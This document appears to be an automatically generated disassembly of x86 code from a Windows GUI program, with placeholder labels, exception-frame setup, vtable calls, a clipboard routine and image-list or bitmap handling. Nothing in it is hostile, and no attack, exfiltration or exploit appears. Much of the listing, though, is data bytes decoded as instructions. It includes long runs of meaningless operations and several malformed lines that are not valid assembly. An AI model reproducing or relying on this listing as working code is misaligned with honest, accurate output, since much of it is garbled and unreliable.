mov ebp esp
add esp 0xfffffff0
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
xor eax eax
push ebp
push sub_436e79
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_436a58
xor eax eax
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0xa ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov eax [ ebp - 0x8 ]
push eax
movzx eax [ ebp - 0xa ]
push eax
call SetClipboardData
cmp [ ebp - 0x10 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_436e80
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
mov eax [ ebp - 0x10 ]
push eax
push 0x9
call SetClipboardData
sub_436e88
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_436d80
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_41abc8
mov edx ebx
mov eax esi
call sub_436e04
jmp r-xdata
pop esi
pop ebx
retn
sub_436ef4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_436f1e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_436f23
mov eax [ rw-data ]
cmp [ eax + 0x2 ] 0x0
je r-xdata
call sub_403a08
mov ebx [ rw-data ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x4 ]
call [ ebx ]
jmp r-xdata
call sub_403a5c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_436f50
push ebx
push esi
call sub_4035e0
mov ebx edx
mov esi eax
cmp esi [ rw-data ]
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41ab9c
test bl bl
jle r-xdata
xor eax eax
mov [ rw-data ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_4035c8
sub_436f84
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_436fb5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_436fbc
retn
mov eax [ rw-data ]
call sub_403254
sub_437050
push esp
jo r-xdata
insb
inc edi
insb
add [ ebx ] al
or eax 0x74754254
je r-xdata
add [ eax ] cl
xor al [ eax ]
and [ eax ] cl
inc edx
add [ eax - 0x78 ] bl
inc ebx
push 0x74746f42
outsd
insd
pop es
inc edx
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
dec esp
popad
jns r-xdata
inc eax
add [ esp + esi + 0x31ec0040 ] ah
inc eax
inc esp
add [ eax - 0x70 ] bl
inc esp
add [ eax - 0x7bffbb70 ] bl
pop [ eax + eax - 0x24 ]
inc bp
add al ah
inc bp
add [ eax + 0x1800448f ] ch
lea eax [ eax + eax + 0x16 ]
push esp
push ebx
jo r-xdata
add [ edi + ecx * 4 ] bl
inc esp
add [ eax - 0x37ffbdf8 ] cl
inc edx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
jno r-xdata
jne r-xdata
inc esp
add al cl
stosd [ edi ]
inc edx
jne r-xdata
add [ eax + ecx + 0x42 ] dl
outsb
jae r-xdata
add al al
or [ edx ] al
or [ esi - 0x7783ffbc ] cl
inc ebx
add [ esi + ecx * 4 + 0x44 ] bh
add al cl
mov [ ebx ] al
inc eax
inc bp
add ah dh
pop [ eax + eax - 0x50 ]
mov es [ eax + eax + 0x7c ]
inc bp
add [ eax - 0x17ffba9a ] dl
mov es [ eax + eax - 0x48 ]
inc bp
add [ edi + ecx * 4 + 0x44 ] al
add al bh
mov [ ebx ] al
pop [ fs : eax + eax + 0x18 ]
mov [ ebx ] eax
js r-xdata
inc edx
add [ esp + esi + 0x34a80040 ] bl
inc eax
add [ esp + esi + 0x34b00040 ] ch
add [ eax + eax ] ah
add [ eax ] al
xor [ ebx + 0x44 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + 0x70 ] dl
inc ebx
add [ ebx ] cl
bound ebp [ edi + eax * 2 + 0x6c ]
jns r-xdata
add [ esp + eax ] dh
inc edx
add [ esp + eax ] ch
inc edx
add [ edi + eax + 0x42 ] dl
add [ eax ] bh
mov [ ebx ] eax
cmp al 0xaf
inc esp
add [ eax ] bh
scasd [ edi ]
inc esp
add [ eax ] cl
mov al 0x44
add ah bh
xchg edx eax
inc esp
add [ eax - 0x66 ] al
inc esp
add [ ecx + ebx * 4 - 0x5d33ffbc ] ah
inc esp
add [ edx + edx * 4 + 0x44 ] al
add [ eax - 0x6e ] cl
inc esp
add [ edx + eax * 8 + 0x44 ] al
add [ eax - 0x3e ] dh
inc esp
add [ eax - 0x3fffbb63 ] cl
xchg ebx eax
inc esp
add [ edi + ebx * 4 ] dl
inc esp
add [ esi + ebx * 4 - 0x5e5fffbc ] cl
inc esp
add [ eax + 0x44 ] cl
add [ eax ] bh
mov dl 0x44
add ah dh
retn 0x44
inc esp
add [ edi + eax + 0x42 ] cl
je r-xdata
adc [ eax + 0x44 ] ch
jo r-xdata
shl [ eax + 0x1004370 ] 0xa
push esp
dec esi
jne r-xdata
add [ eax + 0x24004371 ] dl
add [ eax ] al
add [ eax ] dh
dec ebx
inc esp
push 0x7466654c
or al 0x62
add [ eax + 0x4c00449d ] ah
pop es
inc edx
outsb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x4371f490
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bh
jb r-xdata
insb
inc edi
insb
jns r-xdata
add bl al
jmp sub_4039a8
pop [ eax + eax - 0x28 ]
pop es
add al cl
inc edi
insb
jns r-xdata
push 0x68676952
je r-xdata
inc ecx
add ah cl
mov es [ ebx ]
mov [ esp + eax * 2 + 0x4493f400 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + esi * 2 + 0x72e60043 ] al
inc ebx
add [ ecx + eax + 0x61200000 ] al
inc esp
add [ edi + eax ] dh
inc edx
add [ eax - 0x77ffbfcc ] ch
add [ edx ] al
mov al 0x34
inc eax
add ah cl
mov bl 0x44
add ah ch
xor [ eax ] eax
or [ edx ] dh
inc eax
add al bh
mov [ ebx ] eax
lodsb [ esi ]
rol [ eax + eax - 0x5c ] 0xb4
inc edx
add [ eax + ecx + 0x42 ] ch
push 0x10173
add [ eax ] al
add al 0x0
add [ eax ] al
lea eax [ eax ]
adc al 0x71
inc ebx
jns r-xdata
or eax 0x6c476c62
bound ebp [ edi + eax * 2 + 0x6c ]
jns r-xdata
mov al 0x34
push 0xd706f54
bound ebp [ edi + eax * 2 + 0x6c ]
sub_4372a4
jmp r-xdata
push eax
xchg edx eax
inc ebx
add [ eax ] dl
xchg ebx eax
inc ebx
add [ ebx + edx * 4 + 0x43 ] al
add [ ebx + edx * 4 - 0x6bb3ffbd ] dh
inc ebx
add [ esp + edx * 4 + 0x43 ] dl
add [ esp + edx * 4 + 0x43 ] bl
add [ eax - 0xbffbc6c ] al
xchg esp eax
inc ebx
add ah ch
xchg ebp eax
inc ebx
add [ ecx + edx * 4 ] al
inc ebx
add al dh
nop
inc ebx
add al bh
mov es [ ebx ]
push eax
pop [ ebx ]
sub_437309
add [ edx ] dl
inc esp
add [ edi ] ah
add [ edi ] al
inc edx
jne r-xdata
add bh bh
jo r-xdata
je r-xdata
add dh bh
fsub [ eax + 0x44 ]
add [ eax - 0x80000000 ] al
push cs
add [ eax ] cl
add [ edi ] bl
outsb
jae r-xdata
add [ fs : eax ] al
jb r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ edx + 0x1 ] dh
add bh bh
fcom [ edx + 0x10043 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0x0
or al [ ecx + 0x6c ]
insb
outsd
ja r-xdata
add [ eax ] ch
xchg ecx eax
inc ecx
add [ eax + eax ] bh
add dh bh
sub al 0x93
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4106000b ] al
add [ edi ] al
imul ebp [ esi + 0x74 ] 0x40105473
add [ eax + 0x1 ] ch
add bh bh
xor al 0x92
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
inc edx
imul eax [ ecx + ebp * 2 + 0x4d ] 0x2065646f
dec esi
inc esp
add [ eax + eax ] dh
dec [ esp + eax * 8 + 0x10044 ]
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
str [ ebx ]
inc ebx
outsd
outsb
jae r-xdata
insb
insb
push ebp
jo r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x47050016 ] al
insb
jns r-xdata
imul ebp [ edi + 0x6e ] r-xdata
push eax
add [ eax ] al
sbb [ edx + 0x10043 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec ecx
outsb
js r-xdata
adc [ eax ] al
or al [ edi + 0x72 ]
outsd
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec ebp
inc esp
add [ ecx ] ah
add bh bh
or al 0x93
inc esp
add [ eax + 0x4493 ] ch
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or eax 0x6e410700
arpl [ eax + 0x6f ] bp
jb r-xdata
mov al [ 0x10044 ]
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
sbb al [ eax ]
or dl [ eax + 0x61 ]
jb r-xdata
push sub_437050
jae r-xdata
add eax 0x70796c47
sbb eax [ edx ]
push 0xacff0000
mov al [ 0xffffffffa0bc0044 ]
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040015 ] al
outsd
adc [ eax ] al
jo r-xdata
add [ eax ] eax
pushfd
jpo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5009001d ] al
outsd
jo r-xdata
outsb
je r-xdata
dec [ eax - 0x6e ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop ss
add [ esi ] al
dec esp
popad
jns r-xdata
add bh bh
dec eax
xchg edx eax
adc al 0x0
add al 0x46
insb
popad
je r-xdata
add [ fs : eax ] dl
inc eax
add [ eax + 0x18ff0001 ] al
xchg edx eax
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and eax 0x910c0042
inc ebx
add [ eax ] bl
xchg ecx eax
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
[ eax + 0x1004391 ]
add bh bh
test al 0x91
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] eax
add al 0x44
outsd
ja r-xdata
popad
add [ eax ] al
jo r-xdata
push cs
push eax
popad
jb r-xdata
outsd
outsb
je r-xdata
add [ edx + 0x2cff0000 ] bl
mov eax [ 0x10044 ]
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
jne r-xdata
outsb
je r-xdata
add [ eax + 0x44 ] bh
add [ eax - 0x80000000 ] al
adc eax 0x6f460400
inc ebx
popad
jo r-xdata
and [ ebp + 0x44 ] cl
add [ eax - 0x17ffbb61 ] bh
lahf
inc esp
add [ edi + edi * 4 + 0x44 ] dh
add [ eax - 0x80000000 ] al
adc al [ eax ]
pop es
add [ eax ] eax
jmp [ eax + 0x1004392 ]
outsb
add al 0x0
add [ eax ] al
outsb
je r-xdata
sbb eax [ eax ]
push cs
push eax
popad
jb r-xdata
adc [ eax ] al
0x2cff0000 0x44a1
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5308001e ] al
push 0x6948776f
outsb
je r-xdata
outsb
je r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
inc esp
push esp
adc [ eax ] al
jl r-xdata
adc [ eax ] al
cdq
add [ eax ] al
dec [ eax ]
mov eax [ 0xffffffffa0d00044 ]
add [ eax ] al
and [ edx ] 0x0
pop es
dec edi
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
sub [ ecx ] al
add bh bh
sub [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax [ eax ]
or cl [ edi + 0x6e ]
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
arpl [ ecx + 0x6e ] bp
add [ bx + si ] dl
inc eax
add [ eax + 0x1 ] bh
add bh bh
mov al [ 0x1004392 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and [ eax ] al
or edx [ edx + esi * 2 + 0x61 ]
outsb
jae r-xdata
sbb [ esi ] 0x0
or [ ebx + 0x68 ] dl
outsd
ja r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0xec65646f
xchg ebp eax
inc ebp
add [ eax + eax ] bh
push [ eax - 0x61 ]
inc esp
add [ ecx ] al
rol [ eax + eax ] 0x0
add [ eax + 0x1 ] al
and [ eax ] eax
pop es
push esi
imul esi [ ebx + 0x69 ] 0xe4656c62
jl r-xdata
adc [ eax ] al
jne r-xdata
push 0x6948776f
outsb
je r-xdata
jmp [ edx + edx * 4 + 0x43 ]
add bh bh
xchg edx eax
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
inc ebx
add [ eax - 0x1c000000 ] cl
inc esp
add [ edi + eax ] dh
inc edx
add [ eax - 0x77ffbfcc ] ch
add [ edx ] al
mov al 0x34
inc eax
add [ esp + esi + 0x31ec0040 ] ah
inc eax
add [ eax ] cl
xor al [ eax ]
sar [ eax + 0x43 ] 0x0
adc al 0x7f
inc ebp
add [ edx + eax * 4 + 0x7e540045 ] bl
inc ebp
add [ esp + eax ] dl
inc edx
add al ah
add al [ edx ]
and al 0x4
inc edx
add [ eax + 0x74c0042 ] bl
inc edx
add [ esp + eax ] dh
inc edx
add [ esp + eax ] ch
inc edx
add [ edi + eax + 0x42 ] dl
add [ eax + 0x70 ] cl
inc ebp
add [ eax + 0x7a ] cl
inc ebp
add [ ecx - 0x78afffbb ] cl
inc ebp
add ah bl
xchg [ ebp ] eax
shl [ edx ] 0x1
inc ebp
add [ edx ] cl
push esp
inc edi
insb
jns r-xdata
inc esp
outsd
ja r-xdata
dec ebp
outsd
jne r-xdata
inc esp
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0024 ] al
outsb
popad
jb r-xdata
outsb
je r-xdata
imul ebp [ esi + 0x74 ] r-xdata
imul esp [ ebx + 0x6b ] r-xdata
rol [ eax ] 0x1
add bh bh
rol [ eax ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and al 0x0
or ecx [ edi + 0x6e ]
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
pop ds
add [ edi ] al
push ebx
jo r-xdata
inc [ edx + edx * 4 + 0x10043 ]
add [ eax ] al
add [ eax ] al
add [ eax + 0x4 ] al
add bh bh
test [ edx + 0x10043 ] dl
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
inc eax
add ah bl
jns r-xdata
push 0x7473694c
nop
cwde
ja r-xdata
push esp
dec edi
inc esp
add al bl
add [ eax ] al
insb
inc ebx
insb
je r-xdata
outsb
adc [ eax ] al
push edi
inc eax
add [ eax - 0x5bffbfcc ] dh
xor al 0x40
add ah ch
xor [ eax ] eax
or [ edx ] dh
add [ ebx ] cl
push esp
inc edi
insb
jns r-xdata
inc ebx
add [ eax ] cl
add [ eax ] al
add [ eax + 0x11 ] al
inc eax
add [ esp + esi + 0x34a80040 ] bl
add [ edi ] al
or dl [ edi + eax * 2 + 0x6c ]
jns r-xdata
add [ eax ] al
add [ esp + edx * 2 ] cl
inc edx
jne r-xdata
mov eax esi
test bl bl
je r-xdata
mov esp 0xda8bfffc
push 0x68636143
pop esp
js r-xdata
push 0x7473694c
inc esp
ja r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4035d0
pop [ fs : 0x0 ]
dec [ ebx - 0x31d7f2d ]
je r-xdata
inc eax
add [ eax ] dh
jpo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x31ec0040 ] ah
inc eax
add [ eax ] cl
xor al [ eax ]
fdivr [ ecx + 0x43 ]
add [ eax + 0xc004466 ] al
add [ edi ] al
inc edx
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c8
jle r-xdata
outsb
inc edi
insb
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop esp
js r-xdata
je r-xdata
add esp 0xc
add [ edx - 0x7cdb5eff ] dh
inc ecx
add al ch
mov bh [ ecx - 0x79760004 ]
add [ eax ] 0x0
add [ ebx + 0x74db84c6 ] cl
psubsb mm4 [ 0x64fffcbd ]
pop [ 0x0 ]
cld
mov eax esi
call sub_4570e8
test bl bl
jle r-xdata
and dl 0xfc
push 0x5500408d
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
add [ eax ] dh
add [ eax ] al
add [ eax + 0x11 ] al
inc eax
add [ esp + esi + 0x34a80040 ] bl
inc eax
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x31ec0040 ] ah
inc eax
add [ eax ] cl
xor al [ eax ]
xor [ ebx + 0x43 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + edi * 2 + 0x43 ] bl
outsb
jae r-xdata
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
xor edx edx
mov eax esi
call sub_457094
mov dl 0x1
mov eax [ r-xdata ]
call sub_403224
mov [ esi + 0x80 ] eax
mov ebx edx
add esp 0xfffffff0
call sub_403578
add [ eax + edi * 2 ] al
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + edi * 2 ] al
sub_43786c
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
xor edx edx
mov eax esi
call sub_457094
mov dl 0x1
mov eax [ r-xdata ]
call sub_403224
mov [ esi + 0x80 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_4378c0
push ebx
push esi
call sub_4035e0
mov ebx edx
mov esi eax
mov eax [ esi + 0x80 ]
call sub_403254
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4570e8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c8
sub_4378f0
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x80 ]
call sub_41ab24
mov esi eax
mov eax [ ebx + 0x80 ]
cmp esi [ eax + 0x4 ]
jl r-xdata
mov cl 0x1
mov edx esi
mov eax [ ebx + 0x80 ]
call sub_41aae0
mov eax esi
pop esi
pop ebx
retn
xor ecx ecx
xor edx edx
mov eax ebx
call sub_45751c
mov esi eax
lea edx [ esi + 0x1 ]
mov eax [ ebx + 0x80 ]
call sub_41aa3c
sub_43793c
push ebx
push esi
push edi
push ebp
mov ebp ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_4378f0
mov esi eax
push ebp
mov ecx edi
mov edx esi
mov eax ebx
call sub_457728
inc [ ebx + 0x84 ]
mov eax esi
pop ebp
pop edi
pop esi
pop ebx
retn
sub_437968
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x80 ]
call sub_41ab0c
test al al
je r-xdata
pop esi
pop ebx
retn
dec [ ebx + 0x84 ]
xor ecx ecx
mov edx esi
mov eax [ ebx + 0x80 ]
call sub_41aae0
sub_437998
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403224
mov dl 0x1
mov eax [ r-xdata ]
call sub_403224
mov [ esi + 0x4 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax esi
pop esi
pop ebx
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_4379dc
push ebx
push esi
call sub_4035e0
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_403254
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403244
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c8
sub_437a0c
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] ecx
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov eax [ esp ]
push eax
mov ecx ebp
mov dl 0x1
mov eax [ r-xdata ]
call sub_43786c
mov ebx eax
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_41a474
mov eax [ edi + 0x4 ]
mov edx esi
call sub_41a5d0
mov ebx eax
cmp ebp [ ebx + 0x34 ]
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov eax [ ebx + 0x30 ]
cmp eax [ esp ]
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_437a6c
push ebx
mov ebx edx
test ebx ebx
je r-xdata
pop ebx
retn
cmp [ ebx + 0x84 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ eax + 0x4 ]
call sub_41a714
mov eax ebx
call sub_403254
sub_437a9c
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_403224
mov dl 0x1
mov eax [ r-xdata ]
call sub_428db8
mov esi eax
mov [ ebx + 0x4 ] esi
mov [ esi + 0x14 ] ebx
mov [ esi + 0x10 ] sub_437bd0
mov [ ebx + 0x1c ] 0x8080
mov [ ebx + 0x20 ] 0x1
xor eax eax
add esp 0xfffffff0
call sub_403578
xor edx edx
mov dl al
mov [ ebx + edx * 4 + 0xc ] 0xffffffff
inc eax
cmp al 0x4
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_437998
mov [ rw-data ] eax
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_437b30
push ebx
push esi
call sub_4035e0
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_403254
mov eax esi
call sub_437b8c
cmp [ rw-data ] 0x0
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403244
test bl bl
jle r-xdata
mov eax [ rw-data ]
call sub_437a90
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c8
mov eax [ rw-data ]
call sub_403254
xor eax eax
mov [ rw-data ] eax
sub_437b8c
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov [ esi + edi * 4 + 0xc ] 0xffffffff
inc ebx
cmp bl 0x4
jne r-xdata
mov edx eax
mov eax [ esi + 0x8 ]
call sub_437968
mov edi ebx
and edi 0x7f
mov eax [ esi + edi * 4 + 0xc ]
cmp eax 0xffffffff
je r-xdata
mov edx [ esi + 0x8 ]
mov eax [ rw-data ]
call sub_437a6c
xor eax eax
mov [ esi + 0x8 ] eax
pop edi
pop esi
pop ebx
retn
sub_437bd0
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x4 ]
cmp edx esi
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_42946c
mov [ ebx + 0x1c ] eax
mov eax ebx
call sub_437b8c
cmp [ ebx + 0x2a ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_437c00
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_437b8c
mov edx ebx
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test eax eax
jle r-xdata
mov eax ebx
call sub_42946c
mov [ esi + 0x1c ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
pop edx
xchg edx eax
mov ecx edx
cdq
idiv ecx
test edx edx
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
pop edx
xchg edx eax
mov ecx edx
cdq
idiv ecx
cmp eax 0x4
jle r-xdata
mov edx eax
mov eax esi
call sub_437c78
mov eax 0x1
sub_437c78
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x20 ]
je r-xdata
pop esi
pop ebx
retn
test bl bl
jbe r-xdata
mov eax esi
call sub_437b8c
mov [ esi + 0x20 ] bl
mov edx [ esi + 0x4 ]
mov eax esi
call sub_437bd0
sub_437ca0
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
push edi
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x5 ] 0x2
jne r-xdata
xor eax eax
mov al [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
mov ebx [ edx + eax * 4 + 0xc ]
cmp ebx 0xffffffff
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x3
jae r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov esi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
or esi eax
je r-xdata
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x20 ]
mov ecx edx
cdq
idiv ecx
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov esi eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_428db8
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_43824f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx edi
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx esi
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
push esi
lea eax [ ebp - 0x28 ]
push eax
mov ecx edi
xor edx edx
xor eax eax
call sub_41919c
mov eax [ ebp - 0xc ]
call sub_429380
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_423c94
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
call sub_428b48
mov edx eax
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov bl [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
cmp bl [ eax + 0x20 ]
jl r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push esi
lea eax [ ebp - 0x38 ]
push eax
xor ecx ecx
mov cl bl
inc ecx
imul ecx edi
xor eax eax
mov al bl
imul edi
xor edx edx
call sub_41919c
mov al [ ebp - 0x5 ]
sub al 0x1
jb r-xdata
xor ebx ebx
mov ecx esi
mov edx edi
mov eax [ rw-data ]
call sub_437a0c
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov dl 0x1
